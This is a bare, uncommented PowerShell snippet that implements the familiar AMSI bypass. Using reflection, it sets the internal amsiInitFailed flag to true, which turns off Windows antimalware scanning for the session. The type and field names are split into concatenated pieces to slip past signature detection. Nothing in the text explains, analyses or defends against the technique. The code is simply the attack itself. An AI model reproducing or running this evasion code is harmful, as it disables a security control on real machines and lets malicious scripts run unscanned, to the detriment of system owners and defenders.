```powershell
[Ref].Assembly.GetType('System.Management.Automation.Amsi'+'Utils').GetFie
ld('amsiInit'+'Failed','NonPublic,Static').SetValue($null,!$false)
```
